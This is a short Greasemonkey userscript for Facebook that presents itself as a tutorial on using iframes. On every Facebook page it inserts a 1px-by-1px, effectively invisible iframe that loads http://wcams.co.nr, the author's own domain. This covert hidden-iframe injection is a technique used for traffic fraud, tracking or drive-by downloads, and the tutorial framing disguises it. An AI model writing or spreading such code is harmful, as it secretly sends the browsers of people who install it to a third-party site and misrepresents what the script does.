// ==UserScript==
// @name      Using iframes in greasemonkey
// @namespace  http://wcams.co.nr
// @description    A working example of how to use iframes in greasemonkey
// @version		   0.1
// @include        http://www.facebook.com/*
// @include        https://www.facebook.com/*
// ==/UserScript==

// Get reference element for where you want to place the iframe element
var getRef = document.getElementById("content");

// Create new iframe
var makeIframe = document.createElement("iframe");

// Set the height with .setAttribute method
makeIframe.setAttribute("height", "1px");

// Set the width with .setAttribute method
makeIframe.setAttribute("width", "1px");



// Set the source location of iframe with .setAttribute method
makeIframe.setAttribute("src", "http://wcams.co.nr");


// Use .insertBefore method to put newly created iframe above/before the reference element
var parentDiv = getRef.parentNode;
parentDiv.insertBefore(makeIframe, getRef);